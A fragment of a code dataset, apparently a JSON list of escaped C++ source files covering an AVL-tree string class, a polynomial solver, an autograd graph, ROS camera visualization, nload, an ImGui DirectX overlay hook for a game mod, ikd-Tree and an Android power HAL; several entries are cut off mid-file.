      }\n\n        balancearAVL(node->left);\n        balancearAVL(node->right);\n    }\n\npublic:\n    super_string() {}\n        /*****\n    * void limpiar()\n    ******\n    * Resumen: Limpia la estructura de datos, eliminando todos los nodos del \u00e1rbol.\n    ******\n    * Input:\n    * Ninguno\n    ******\n    * Returns:\n    * void, No retorna nada.\n    *****/\n\n    void limpiar() {\n        function<void(nodo*)> deleteAllNodes = [&](nodo* node) {\n            if (node) {\n                deleteAllNodes(node->left);\n                deleteAllNodes(node->right);\n                delete node;\n            }\n        };\n        deleteAllNodes(root);\n        root = nullptr;\n        height = 0;\n        length = 0;\n    }\n    void inorderTraversal(nodo* node, char* result, int& index) {\n        if (node) {\n            inorderTraversal(node->left, result, index);\n            result[index++] = node->c;\n            inorderTraversal(node->right, result, index);\n        }\n    }\n    /*****\n    * string stringizar()\n    ******\n    * Resumen: Devuelve una representaci\u00f3n en forma de cadena del super_string.\n    ******\n    * Input:\n    * Ninguno\n    ******\n    * Returns:\n    * string, Representaci\u00f3n del super_string como cadena.\n    *****/\n    string stringizar() {\n        char* result = new char[length + 1];\n        result[length] = '\\0';\n\n        int index = 0;\n        inorderTraversal(root, result, index);\n\n        string strResult(result);\n        delete[] result;\n        return strResult;\n    }\n    /* void eliminar(int l, int r)\n    ******\n    * Resumen: Elimina los caracteres en el rango [l, r] del super_string.\n    ******\n    * Input:\n    * int l : \u00cdndice de inicio del rango a eliminar.\n    * int r : \u00cdndice de fin del rango a eliminar.\n    ******\n    * Returns:\n    * void, No retorna nada.\n    *****/\n    void eliminar(int l, int r) {\n        function<void(nodo*&, int, int)> remove = [&](nodo*& node, int start, int end) {\n            if (!node) return;\n            if (node->index >= start && node->index <= end) {\n                nodo* temp = node;\n                node = nullptr; // Eliminar nodo\n                delete temp;\n            } else {\n                if (node->index < start) {\n                    remove(node->right, start, end);\n                }\n                if (node->index > end) {\n                    remove(node->left, start, end);\n                }\n            }\n        };\n\n        remove(root, l, r);\n    }\n    /*****\n    * void actualizarIndices(nodo* node)\n    ******\n    * Resumen: Actualiza los \u00edndices de los nodos en el \u00e1rbol.\n    ******\n    * Input:\n    * nodo* node : Puntero al nodo ra\u00edz del sub\u00e1rbol que se actualizar\u00e1.\n    ******\n    * Returns:\n    * void, No retorna nada.\n    *****/\n    void actualizarI",
    "#include \"header/Solver.hpp\"\n#include \"header/NumberTheoreticTransform.hpp\"\n#include \"header/Exponentiation.hpp\"\n#include \"header/Polynomial.hpp\"\n#include \"header/IO.hpp\"\n\n#include <chrono>\n\nusing namespace std;\n\nSolver::Solver(){\n    this->Run();\n}\n\nvoid Solver::Run(){\n    bool restart = true;\n    while (restart){\n        IO io;\n        setN(io.getN());\n        setM(io.getM());\n        setR(io.getR());\n        auto start = std::chrono::steady_clock::now();\n        int ans = Calculate(N,M,R);\n        auto end = std::chrono::steady_clock::now();\n        auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start).count();\n        io.setDuration(duration);\n        io.showAnswer(ans, ans < 0);\n        restart = io.askRestart();\n    }\n}\n\nvoid Solver::setN(int _N){\n    N = _N;\n}\n\nvoid Solver::setM(int _M){\n    M = _M;\n}\n\nvoid Solver::setR(int _R){\n    R = _R;\n}\n\nint Solver::Calculate(int N, int M, int R){\n    if (R==0){\n        R = M;\n    }\n    NumberTheoreticTransform::getInstance().setM(M);\n    int C = Exponentiation<int>::getInstance().BinaryExponentiation(2, N, MOD);\n    Polynomial result(M-1);\n    Polynomial temp(1);\n    Polynomial expo(M-1);\n    temp.getCoefficients()[0] = 1;\n    temp.getCoefficients()[1] = 1;\n    expo = Exponentiation<Polynomial>::getInstance().BinaryExponentiation(temp, N);\n\n    // temp.printCoefficients();\n    // cout << \"\\n\";\n    // expo.printCoefficients();\n    // cout << \"\\n\";\n\n    for (int j=0; j<M; j++){\n        result.getCoefficients()[(j + M - R) % M] += expo.getCoefficients()[j];\n    }\n    for (int i=2; i<M; i++){\n        temp.getCoefficients().push_back(1);\n        temp.getCoefficients()[i-1] = 0;\n        temp.setDegree(temp.getDegree()+1);\n        expo = Exponentiation<Polynomial>::getInstance().BinaryExponentiation(temp, N);\n\n        // temp.printCoefficients();\n        // cout << \"\\n\";\n        // expo.printCoefficients();\n        // cout << \"\\n\";\n\n        for (int j=0; j<M; j++){\n            result.getCoefficients()[(j + (i * (M-R))) % M] += expo.getCoefficients()[j];\n        }\n    }\n    result.getCoefficients()[0] = (C + result.getCoefficients()[0]) % MOD;\n\n\n    // result.printCoefficients();\n\n\n    result.reducePolynom(M);\n\n    // Theoritically only X_0 persits, if so Divide by M, otherwise report possible error\n\n    int k = 1;\n    while (k < M && result.getCoefficients()[k] == 0){\n        k++;\n    }\n\n    int answer = result.getCoefficients()[0];\n\n    answer = ((1LL) * answer * Exponentiation<int>::getInstance().inverse(M, MOD)) % MOD;\n    if (k == M){\n        // Show Answer, as a positive\n        return answer;\n    } else {\n        // Report, as a negative\n        return answer * -1;\n    }\n}",
    "#include \"include/autograd.h\"\n#include \"include/tensor.h\"\n#include \"include/ops.h\"\n\n#include <vector>\n#include <memory>\n#include <string>\n#include <iostream>\n\n// Implement the default constructor for the GraphNode class\nvoid ComputeGraph::add(Operation* operation) {\n    operations.push_back(operation);\n}\n\nvoid ComputeGraph::backward() {\n    // Print the number of operations in the graph\n    std::cout << \"Number of operations in the graph: \" << operations.size() << std::endl;\n    // Set the gradient of the last operation to 1\n    Tensor output_grad(std::vector<int>{1}, std::vector<float>{1.0}, false);\n    // Traverse the graph in reverse order to perform backpropagation\n    for (int i = operations.size() - 1; i >= 0; i--) {\n        if (auto* sum = dynamic_cast<Sum*>(operations[i])) {\n            sum->backward(output_grad);\n            output_grad = Tensor(sum->input.shape, sum->input.grad, false);\n        }\n        else if (auto* linear = dynamic_cast<Linear*>(operations[i])) {\n            linear->backward(output_grad);\n            output_grad = Tensor(linear->input.shape, linear->input.grad, false);\n        }\n        else if (auto* relu = dynamic_cast<ReLU*>(operations[i])) {\n            relu->backward(output_grad);\n            output_grad = Tensor(relu->input.shape, relu->input.grad, false);\n        }\n        else if (auto* cross_entropy = dynamic_cast<CrossEntropy*>(operations[i])) {\n            cross_entropy->backward(output_grad);\n            output_grad = Tensor(cross_entropy->input.shape, cross_entropy->input.grad, false);\n        }\n        else {\n            throw std::invalid_argument(\"Operation not supported\");\n        }\n    }   \n}\n\nvoid ComputeGraph::sgd_step(float lr) {\n    for (int i = 0; i < operations.size(); i++) {\n        if (auto* linear = dynamic_cast<Linear*>(operations[i])) {\n            if (linear->weights.require_grad) {\n            for (int j = 0; j < linear->weights.numel(); j++) {\n                linear->weights.data[j] -= lr * linear->weights.grad[j];\n            }\n            }\n            if (linear->bias.require_grad) {\n            for (int j = 0; j < linear->bias.numel(); j++) {\n                linear->bias.data[j] -= lr * linear->bias.grad[j];\n            }\n            }\n        }\n    }\n}",
    "#include \"CameraPoseVisualization.h\"\n\nconst Eigen::Vector3d CameraPoseVisualization::imlt = Eigen::Vector3d(-1.0, -0.5, 1.0);\nconst Eigen::Vector3d CameraPoseVisualization::imrt = Eigen::Vector3d( 1.0, -0.5, 1.0);\nconst Eigen::Vector3d CameraPoseVisualization::imlb = Eigen::Vector3d(-1.0,  0.5, 1.0);\nconst Eigen::Vector3d CameraPoseVisualization::imrb = Eigen::Vector3d( 1.0,  0.5, 1.0);\nconst Eigen::Vector3d CameraPoseVisualization::lt0 = Eigen::Vector3d(-0.7, -0.5, 1.0);\nconst Eigen::Vector3d CameraPoseVisualization::lt1 = Eigen::Vector3d(-0.7, -0.2, 1.0);\nconst Eigen::Vector3d CameraPoseVisualization::lt2 = Eigen::Vector3d(-1.0, -0.2, 1.0);\nconst Eigen::Vector3d CameraPoseVisualization::oc = Eigen::Vector3d(0.0, 0.0, 0.0);\n\nvoid Eigen2Point(const Eigen::Vector3d& v, geometry_msgs::Point& p) {\n    p.x = v.x();\n    p.y = v.y();\n    p.z = v.z();\n}\n\nCameraPoseVisualization::CameraPoseVisualization(float r, float g, float b, float a)\n    : m_marker_ns(\"CameraPoseVisualization\"), m_scale(0.2), m_line_width(0.01) {\n    m_image_boundary_color.r = r;\n    m_image_boundary_color.g = g;\n    m_image_boundary_color.b = b;\n    m_image_boundary_color.a = a;\n    m_optical_center_connector_color.r = r;\n    m_optical_center_connector_color.g = g;\n    m_optical_center_connector_color.b = b;\n    m_optical_center_connector_color.a = a;\n}\n\nvoid CameraPoseVisualization::setImageBoundaryColor(float r, float g, float b, float a) {\n    m_image_boundary_color.r = r;\n    m_image_boundary_color.g = g;\n    m_image_boundary_color.b = b;\n    m_image_boundary_color.a = a;\n}\n\nvoid CameraPoseVisualization::setOpticalCenterConnectorColor(float r, float g, float b, float a) {\n    m_optical_center_connector_color.r = r;\n    m_optical_center_connector_color.g = g;\n    m_optical_center_connector_color.b = b;\n    m_optical_center_connector_color.a = a;\n}\n\nvoid CameraPoseVisualization::setScale(double s) {\n    m_scale = s;\n}\nvoid CameraPoseVisualization::setLineWidth(double width) {\n    m_line_width = width;\n}\nvoid CameraPoseVisualization::add_edge(const Eigen::Vector3d& p0, const Eigen::Vector3d& p1){\n    visualization_msgs::Marker marker;\n\n    marker.ns = m_marker_ns;\n    marker.id = m_markers.size() + 1;\n    marker.type = visualization_msgs::Marker::LINE_LIST;\n    marker.action = visualization_msgs::Marker::ADD;\n    marker.scale.x = 0.01;\n\n    marker.color.b = 1.0f;\n    marker.color.a = 1.0;\n\n    geometry_msgs::Point point0, point1;\n\n    Eigen2Point(p0, point0);\n    Eigen2Point(p1, point1);\n\n    marker.points.push_back(point0);\n    marker.points.push_back(point1);\n\n    m_markers.push_back(marker);\n}\n\nvoid CameraPoseVisualization::add_loopedge(const Eigen::Vector3d& p0, const Eigen::Vector3d& p1){\n    //m_markers.clear();\n    visualization_msgs::Marker marker;\n\n    marker.ns = m_marker_ns;\n    marker.id = m_markers.size() + 1;\n    marker.type = visualization_msgs::Marker::LINE_STRIP;\n    marker.action = visualization_msgs::Marker::ADD;\n    marker.lifetime = ros::Duration();\n    //marker.scale.x = 0.4;\n    marker.scale.x = 0.02;\n    marker.color.r = 1.0f;\n    //marker.color.g = 1.0f;\n    //marker.color.b = 1.0f;\n    marker.color.a = 1.0;\n\n    geometry_msgs::Point point0, point1;\n\n    Eigen2Point(p0, point0);\n    Eigen2Point(p1, point1);\n\n    marker.points.push_back(point0);\n    marker.points.push_back(point1);\n\n    m_markers.push_back(marker);\n}\n\n\nvoid CameraPoseVisualization::add_pose(const Eigen::Vector3d& p, const Eigen::Quaterniond& q) {\n    visualization_msgs::Marker marker;\n\n    marker.ns = m_marker_ns;\n    marker.id = 0;\n    marker.type = visualization_msgs::Marker::LINE_STRIP;\n    marker.action = visualization_msgs::Marker::ADD;\n    marker.scale.x = m_line_width;\n\n    marker.pose.position.x = 0.0;\n    marker.pose.position.y = 0.0;\n    marker.pose.position.z = 0.0;\n    marker.pose.orientation.w = 1.0;\n    marker.pose.orientation.x = 0.0;\n    marker.pose.orientation.y = 0.0;\n    marker.pose.orientation.z = 0.0;\n\n\n    geometry_msgs::Point pt_lt, pt_lb, pt_rt, pt_rb, pt_oc, pt_lt0, pt_lt1, pt_lt2;\n\n    Eigen2Point(q * (m_scale *imlt) + p, pt_lt);\n    Eigen2Point(q * (m_scale *imlb) + p, pt_lb);\n    Eigen2Point(q * (m_scale *imrt) + p, pt_rt);\n    Eigen2Point(q * (m_scale *imrb) + p, pt_rb);\n    Eigen2Point(q * (m_scale *lt0 ) + p, pt_lt0);\n    Eigen2Point(q * (m_scale *lt1 ) + p, pt_lt1);\n    Eigen2Point(q * (m_scale *lt2 ) + p, pt_lt2);\n    Eigen2Point(q * (m_scale *oc  ) + p, pt_oc);\n\n    // image boundaries\n    marker.points.push_back(pt_lt);\n    marker.points.push_back(pt_lb);\n    marker.colors.push_back(m_image_boundary_color);\n    marker.colors.push_back(m_image_boundary_color);\n\n    marker.points.push_back(pt_lb);\n    marker.points.push_back(pt_rb);\n    marker.colors.push_back(m_image_boundary_color);\n    marker.colors.push_back(m_image_boundary_color);\n\n    marker.points.push_back(pt_rb);\n    marker.points.push_back(pt_rt);\n    marker.colors.push_back(m_image_boundary_color);\n    marker.colors.push_back(m_image_boundary_color);\n\n    m",
    "/*\n * nload\n * real time monitor for network traffic\n * Copyright (C) 2001 - 2018 by Roland Riegel <feedback@roland-riegel.de>\n *\n * This program is free software; you can redistribute it and/or modify\n * it under the terms of the GNU General Public License as published by\n * the Free Software Foundation; either version 2 of the License, or\n * (at your option) any later version.\n *\n * This program is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n * GNU General Public License for more details.\n *\n * You should have received a copy of the GNU General Public License\n * along with this program; if not, write to the Free Software\n * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.\n */\n\n#include \"deviceview.h\"\n\n#include \"device.h\"\n#include \"graph.h\"\n#include \"setting.h\"\n#include \"settingstore.h\"\n#include \"stringutils.h\"\n#include \"window.h\"\n\n#include <algorithm>\n#include <iomanip>\n#include <sstream>\n\nusing namespace std;\n\nDeviceView::DeviceView(Device* device)\n    : m_deviceNumber(0), m_totalNumberOfDevices(0), m_device(device)\n{\n}\n\nDeviceView::~DeviceView()\n{\n}\n\nvoid DeviceView::update()\n{\n    if(m_device->exists())\n    {\n        const Statistics& statistics = m_device->getStatistics();\n\n        m_deviceGraphIn.update(statistics.getDataInPerSecond());\n        m_deviceGraphOut.update(statistics.getDataOutPerSecond());\n    }\n    else\n    {\n        m_deviceGraphIn.resetTrafficData();\n        m_deviceGraphOut.resetTrafficData();\n    }\n}\n\n// print the device's data\nvoid DeviceView::print(Window& window)\n{\n    int width = window.getWidth();\n    int height = window.getHeight();\n\n    // print header\n    if(height > 2)\n    {\n        string deviceName = m_device->getName();\n        string ipv4 = m_device->getIpV4Address();\n\n        if(m_device->exists())\n        {\n            if(!ipv4.empty())\n                window.print() << \"Device \" << deviceName << \" [\" << ipv4 << \"] (\" << (m_deviceNumber + 1) << \"/\" << m_totalNumberOfDevices << \"):\" << endl;\n            else\n                window.print() << \"Device \" << deviceName << \" (\" << (m_deviceNumber + 1) << \"/\" << m_totalNumberOfDevices << \"):\" << endl;\n            window.print() << string(width, '=');\n        }\n        else\n        {\n            // if device does not exist print warning message\n            window.print() << \"Device \" << deviceName << \" (\" << (m_deviceNumber + 1) << \"/\" << m_totalNumberOfDevices << \"): does not exist\" << endl;\n            window.print() << string(width, '=') << endl;\n\n            // and exit\n            return;\n        }\n    }\n    if(width < 25 || height < 8)\n    {\n        window.print() << \"Please enlarge console for viewing device information.\" << endl;\n        return;\n    }\n    \n    // format statistics\n    vector<string> statLinesIn;\n    vector<string> statLinesOut;\n\n    generateStatisticsIn(statLinesIn);\n    generateStatisticsOut(statLinesOut);\n\n    size_t statLineInMaxLength = max_element(statLinesIn.begin(), statLinesIn.end(), sizeLess())->size();\n    size_t statLineOutMaxLength = max_element(statLinesOut.begin(), statLinesOut.end(), sizeLess())->size();\n    int statLineMaxLength = statLineInMaxLength > statLineOutMaxLength ? statLineInMaxLength : statLineOutMaxLength;\n\n    // if graphs should be hidden ...\n    if(SettingStore::get(\"MultipleDevices\"))\n    {\n        window.print() << \"Incoming:\";\n        window.print(width / 2) << \"Outgoing:\" << endl;\n        \n        int statusY = window.getY();\n        \n        printStatistics(window, statLinesIn, 0, statusY);\n        printStatistics(window, statLinesOut, width / 2, statusY);\n        \n        window.print() << endl;\n    }\n    // ... or not\n    else\n    {\n        // calculate layout\n        int lines = height - window.getY();\n        int linesForIn = (lines + 1) / 2;\n        int linesForOut = lines - linesForIn;\n        int dirInY = window.getY();\n        int dirOutY = dirInY + linesForIn;\n\n        int statisticsX = width - statLineMaxLength - 1;\n        statisticsX -= statisticsX % 5;\n\n        if(linesForOut <= 5)\n        {\n            linesForIn = lines;\n            linesForOut = 0;\n            dirOutY = height;\n        }\n\n        // calculate deflection of graphs\n        unsigned long long maxDeflectionIn = (unsigned long long) SettingStore::get(\"BarMaxIn\") * 1024 / 8;\n        unsigned long long maxDeflectionOut = (unsigned long long) SettingStore::get(\"BarMaxOut\") * 1024 / 8;\n\n        if(maxDeflectionIn < 1)\n            maxDeflectionIn = roundUpMaxDeflection(m_deviceGraphIn.calcMaxDeflection());\n        if(maxDeflectionOut < 1)\n            maxDeflectionOut = roundUpMaxDeflection(m_deviceGraphOut.calcMaxDeflection());\n\n        // print incoming data\n        if(linesForIn > 5)\n        {\n            window.print(0, dirInY) << \"Incoming (100% @ \" << formatTrafficValue(maxDeflectionIn, 0) << \"):\" << endl;\n\n            if(statist",
    "#include \"ImGuiRenderer.h\"\n#include <imgui.h>\n#include <imgui_impl_dx11.h>\n#include <imgui_impl_win32.h>\n\nvoid ImGui::ImGuiRenderer::D3D11CreateDeviceAndSwapChainHook::Install()\n{\n\tREL::Relocation<std::uintptr_t> target{ RELOCATION_ID(254484, 254484) };  // D3D11CreateDeviceAndSwapChainHook\n\tstl::write_vfunc<D3D11CreateDeviceAndSwapChainHook>(target, 0);\n\tlogger::info(\"Writing D3D11CreateDeviceAndSwapChain hook to address 0x{:x}\", target.address());\n}\n\nHRESULT ImGui::ImGuiRenderer::D3D11CreateDeviceAndSwapChainHook::thunk(IDXGIAdapter* pAdapter, D3D_DRIVER_TYPE DriverType, HMODULE Software, UINT Flags, const D3D_FEATURE_LEVEL* pFeatureLevels, UINT FeatureLevels, UINT SDKVersion, const DXGI_SWAP_CHAIN_DESC* pSwapChainDesc, IDXGISwapChain** ppSwapChain, ID3D11Device** ppDevice, D3D_FEATURE_LEVEL* pFeatureLevel, ID3D11DeviceContext** ppImmediateContext)\n{\n\tHRESULT ret = func(pAdapter, DriverType, Software, Flags, pFeatureLevels, FeatureLevels, SDKVersion, pSwapChainDesc, ppSwapChain, ppDevice, pFeatureLevel, ppImmediateContext);\n\n\tlogger::info(\"Initializing ImGui...\");\n\n\tif (FAILED(ret))\n\t\treturn ret;\n\n\tstd::uintptr_t* vtbl = (std::uintptr_t*)(*ppSwapChain);\n\tvtbl = (std::uintptr_t*)vtbl[0];\n\n\tREL::Relocation<std::uintptr_t> target{ (uintptr_t)vtbl };\n\n\n\tlogger::info(\"Writing PresentHook hook to address 0x{:x}\", target.address());\n\tstl::write_vfunc<PresentHook>(target, 8);\n\n\tImGui::CreateContext();\n\n\tHWND hWnd = GetActiveWindow();\n\tGetWindowRect(hWnd, &oldRect);\n\n\tif (!ImGui_ImplWin32_Init(hWnd))\n\t{\n\t\tlogger::error(\"ImGui initialization failed (Win32)\");\n\t\treturn ret;\n\t}\n\tif (!ImGui_ImplDX11_Init(*ppDevice, *ppImmediateContext))\n\t{\n\t\tlogger::error(\"ImGui initialization failed (DX11)\");\n\t\treturn ret;\n\t}\n\n\tlogger::info(\"Successfully initialized ImGui...\");\n\tinitialized.store(true);\n\n\tauto& io = ImGui::GetIO();\n\tio.ConfigFlags |= (ImGuiConfigFlags_NavEnableKeyboard | ImGuiConfigFlags_NavEnableGamepad | ImGuiConfigFlags_NoMouseCursorChange);\n\tio.IniFilename = nullptr;\n\tio.ConfigWindowsMoveFromTitleBarOnly = true;\n\t{\n\t\tio.ConfigWindowsMoveFromTitleBarOnly = true;\n\t\tio.ConfigFlags |= ImGuiConfigFlags_NoMouseCursorChange;\n\t}\n\n\treturn ret;\n}\n\nvoid ImGui::ImGuiRenderer::Init()\n{\n\tD3D11CreateDeviceAndSwapChainHook::Install();\n\tClipCursorHook::Install();\n}\n\nvoid ImGui::ImGuiRenderer::UnregisterImGuiElement(ImGuiElement* element)\n{\n\tauto it = elements.find(element);\n\n\tif (it != elements.end())\n\t\telements.erase(it);\n}\n\nbool ImGui::ImGuiRenderer::isInitialized()\n{\n\treturn initialized.load();\n}\n\nHRESULT ImGui::ImGuiRenderer::PresentHook::thunk(IDXGISwapChain* a_self, UINT a_syncInterval, UINT a_flags)\n{\n\tImGui_ImplDX11_NewFrame();\n\tImGui_ImplWin32_NewFrame();\n\n\tImGui::NewFrame();\n\n\n\tfor (const auto& pElement : elements)\n\t\tpElement->DoFrame();\n\n\tImGui::EndFrame();\n\tImGui::Render();\n\tImGui_ImplDX11_RenderDrawData(ImGui::GetDrawData());\n\treturn func(a_self, a_syncInterval, a_flags);\n}\n\nvoid ImGui::ImGuiRenderer::ClipCursorHook::Install()\n{\n\tREL::Relocation<std::uintptr_t> target{ RELOCATION_ID(641385, 641385) };  // ClipCursorHook\n\tstl::write_vfunc<ClipCursorHook>(target, 0);\n\tlogger::info(\"Writing ClipCursorHook hook to address 0x{:x}\", target.address());\n}\n\nBOOL ImGui::ImGuiRenderer::ClipCursorHook::thunk(RECT* lpRect)\n{\n\tauto& io = GetIO();\n\tif (io.MouseDrawCursor)\n\t\t*lpRect = oldRect;\n\n\treturn func(lpRect);\n}\n",
    "#include \"ikd_Tree.h\"\n\n/*\nDescription: ikd-Tree: an incremental k-d tree for robotic applications\nAuthor: Yixi Cai\nemail: yixicai@connect.hku.hk\n*/\n\ntemplate <typename PointType>\nKD_TREE<PointType>::KD_TREE(float delete_param, float balance_param, float box_length)\n{\n    delete_criterion_param = delete_param;\n    balance_criterion_param = balance_param;\n    downsample_size = box_length;\n    Rebuild_Logger.clear();\n    termination_flag = false;\n    start_thread();\n}\n\ntemplate <typename PointType>\nKD_TREE<PointType>::~KD_TREE()\n{\n    stop_thread();\n    Delete_Storage_Disabled = true;\n    delete_tree_nodes(&Root_Node);\n    PointVector().swap(PCL_Storage);\n    Rebuild_Logger.clear();\n}\n\ntemplate <typename PointType>\nvoid KD_TREE<PointType>::InitializeKDTree(float delete_param, float balance_param, float box_length)\n{\n    Set_delete_criterion_param(delete_param);\n    Set_balance_criterion_param(balance_param);\n    set_downsample_param(box_length);\n}\n\ntemplate <typename PointType>\nvoid KD_TREE<PointType>::InitTreeNode(KD_TREE_NODE *root)\n{\n    root->point.x = 0.0f;\n    root->point.y = 0.0f;\n    root->point.z = 0.0f;\n    root->node_range_x[0] = 0.0f;\n    root->node_range_x[1] = 0.0f;\n    root->node_range_y[0] = 0.0f;\n    root->node_range_y[1] = 0.0f;\n    root->node_range_z[0] = 0.0f;\n    root->node_range_z[1] = 0.0f;\n    root->radius_sq = 0.0f;\n    root->division_axis = 0;\n    root->father_ptr = nullptr;\n    root->left_son_ptr = nullptr;\n    root->right_son_ptr = nullptr;\n    root->TreeSize = 0;\n    root->invalid_point_num = 0;\n    root->down_del_num = 0;\n    root->point_deleted = false;\n    root->tree_deleted = false;\n    root->need_push_down_to_left = false;\n    root->need_push_down_to_right = false;\n    root->point_downsample_deleted = false;\n    root->working_flag = false;\n    pthread_mutex_init(&(root->push_down_mutex_lock), NULL);\n}\n\ntemplate <typename PointType>\nint KD_TREE<PointType>::size()\n{\n    int s = 0;\n    if (Rebuild_Ptr == nullptr || *Rebuild_Ptr != Root_Node)\n    {\n        if (Root_Node != nullptr)\n        {\n            return Root_Node->TreeSize;\n        }\n        else\n        {\n            return 0;\n        }\n    }\n    else\n    {\n        if (!pthread_mutex_trylock(&working_flag_mutex))\n        {\n            s = Root_Node->TreeSize;\n            pthread_mutex_unlock(&working_flag_mutex);\n            return s;\n        }\n        else\n        {\n            return Treesize_tmp;\n        }\n    }\n}\n\ntemplate <typename PointType>\nBoxPointType KD_TREE<PointType>::tree_range()\n{\n    BoxPointType range;\n    if (Rebuild_Ptr == nullptr || *Rebuild_Ptr != Root_Node)\n    {\n        if (Root_Node != nullptr)\n        {\n            range.vertex_min[0] = Root_Node->node_range_x[0];\n            range.vertex_min[1] = Root_Node->node_range_y[0];\n            range.vertex_min[2] = Root_Node->node_range_z[0];\n            range.vertex_max[0] = Root_Node->node_range_x[1];\n            range.vertex_max[1] = Root_Node->node_range_y[1];\n            range.vertex_max[2] = Root_Node->node_range_z[1];\n        }\n        else\n        {\n            memset(&range, 0, sizeof(range));\n        }\n    }\n    else\n    {\n        if (!pthread_mutex_trylock(&working_flag_mutex))\n        {\n            range.vertex_min[0] = Root_Node->node_range_x[0];\n            range.vertex_min[1] = Root_Node->node_range_y[0];\n            range.vertex_min[2] = Root_Node->node_range_z[0];\n            range.vertex_max[0] = Root_Node->node_range_x[1];\n            range.vertex_max[1] = Root_Node->node_range_y[1];\n            range.vertex_max[2] = Root_Node->node_range_z[1];\n            pthread_mutex_unlock(&working_flag_mutex);\n        }\n        else\n        {\n            memset(&range, 0, sizeof(range));\n        }\n    }\n    return range;\n}\n\ntemplate <typename PointType>\nint KD_TREE<PointType>::validnum()\n{\n    int s = 0;\n    if (Rebuild_Ptr == nullptr || *Rebuild_Ptr != Root_Node)\n    {\n        if (Root_Node != nullptr)\n            return (Root_Node->TreeSize - Root_Node->invalid_point_num);\n        else\n            return 0;\n    }\n    else\n    {\n        if (!pthread_mutex_trylock(&working_flag_mutex))\n        {\n            s = Root_Node->TreeSize - Root_Node->invalid_point_num;\n            pthread_mutex_unlock(&working_flag_mutex);\n            return s;\n        }\n        else\n        {\n            return -1;\n        }\n    }\n}\n\ntemplate <typename PointType>\nvoid KD_TREE<PointType>::root_alpha(float &alpha_bal, float &alpha_del)\n{\n    if (Rebuild_Ptr == nullptr || *Rebuild_Ptr != Root_Node)\n    {\n        alpha_bal = Root_Node->alpha_bal;\n        alpha_del = Root_Node->alpha_del;\n        return;\n    }\n    else\n    {\n        if (!pthread_mutex_trylock(&working_flag_mutex))\n        {\n            alpha_bal = Root_Node->alpha_bal;\n            alpha_del = Root_Node->alpha_del;\n            pthread_mutex_unlock(&working_flag_mutex);\n            return;\n        }\n        else\n        {\n            alpha_bal = alpha_bal_tmp;\n            alpha_del = alpha_del_tmp;\n            r",
    "/*\n * Copyright (C) 2020 The Android Open Source Project\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#define LOG_TAG \"android.hardware.power-service.begonia.ext-libperfmgr\"\n\n#include \"PowerExt.h\"\n\n#include <android-base/file.h>\n#include <android-base/logging.h>\n#include <android-base/properties.h>\n#include <android-base/stringprintf.h>\n#include <android-base/strings.h>\n#include <perfmgr/HintManager.h>\n#include <utils/Log.h>\n\n#include <mutex>\n\n#include \"PowerSessionManager.h\"\n\nnamespace aidl {\nnamespace google {\nnamespace hardware {\nnamespace power {\nnamespace impl {\nnamespace pixel {\n\nusing ::android::perfmgr::HintManager;\n\nndk::ScopedAStatus PowerExt::setMode(const std::string &mode, bool enabled) {\n    LOG(DEBUG) << \"PowerExt setMode: \" << mode << \" to: \" << enabled;\n\n    if (enabled) {\n        HintManager::GetInstance()->DoHint(mode);\n    } else {\n        HintManager::GetInstance()->EndHint(mode);\n    }\n    if (HintManager::GetInstance()->GetAdpfProfile() &&\n        HintManager::GetInstance()->GetAdpfProfile()->mReportingRateLimitNs > 0) {\n        PowerSessionManager::getInstance()->updateHintMode(mode, enabled);\n    }\n\n    return ndk::ScopedAStatus::ok();\n}\n\nndk::ScopedAStatus PowerExt::isModeSupported(const std::string &mode, bool *_aidl_return) {\n    bool supported = HintManager::GetInstance()->IsHintSupported(mode);\n    LOG(INFO) << \"PowerExt mode \" << mode << \" isModeSupported: \" << supported;\n    *_aidl_return = supported;\n    return ndk::ScopedAStatus::ok();\n}\n\nndk::ScopedAStatus PowerExt::setBoost(const std::string &boost, int32_t durationMs) {\n    LOG(DEBUG) << \"PowerExt setBoost: \" << boost << \" duration: \" << durationMs;\n    if (HintManager::GetInstance()->GetAdpfProfile() &&\n        HintManager::GetInstance()->GetAdpfProfile()->mReportingRateLimitNs > 0) {\n        PowerSessionManager::getInstance()->updateHintBoost(boost, durationMs);\n    }\n\n    if (durationMs > 0) {\n        HintManager::GetInstance()->DoHint(boost, std::chrono::milliseconds(durationMs));\n    } else if (durationMs == 0) {\n        HintManager::GetInstance()->DoHint(boost);\n    } else {\n        HintManager::GetInstance()->EndHint(boost);\n    }\n\n    return ndk::ScopedAStatus::ok();\n}\n\nndk::ScopedAStatus PowerExt::isBoostSupported(const std::string &boost, bool *_aidl_return) {\n    bool supported = HintManager::GetInstance()->IsHintSupported(boost);\n    LOG(INFO) << \"PowerExt boost \" << boost << \" isBoostSupported: \" << supported;\n    *_aidl_return = supported;\n    return ndk::ScopedAStatus::ok();\n}\n\n}  // namespace pixel\n}  // namespace impl\n}  // namespace power\n}  // namespace hardware\n}  // namespace google\n}  // namespace aidl\n",
